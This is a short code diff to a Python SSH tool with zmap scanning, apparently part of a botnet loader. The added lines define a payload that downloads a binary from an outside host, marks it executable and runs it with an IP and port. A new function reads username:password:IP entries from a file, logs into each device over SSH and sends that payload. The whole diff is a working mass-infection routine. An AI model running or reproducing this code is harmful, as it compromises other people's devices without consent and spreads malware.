@@ -3,6 +3,20 @@ import os, sys, time, paramiko
 from ssh_core.paramiko import *
 from ssh_core.zmap_scan import *
 
+payload = "rm -rf unix; curl -O https://krispy.lol/unix; chmod 777 unix; ./unix 46.31.77.155 77 test"
+
+def temp_loader(filename: str) -> None:
+    devices = open(filename, "r").read().split("\n")
+    for line in devices:
+        if line != "":
+            info = line.replace("DUP ", "").split(":")
+            user = info[0]
+            passw = info[1]
+            ip = info[2]
+            SSH(ip, user, passw).send_cmd(payload)
+
+
+
 HELP_MENU = """    Tools              Description
 ______________________________________________________
     -z                 Start a new ZMAP Scan
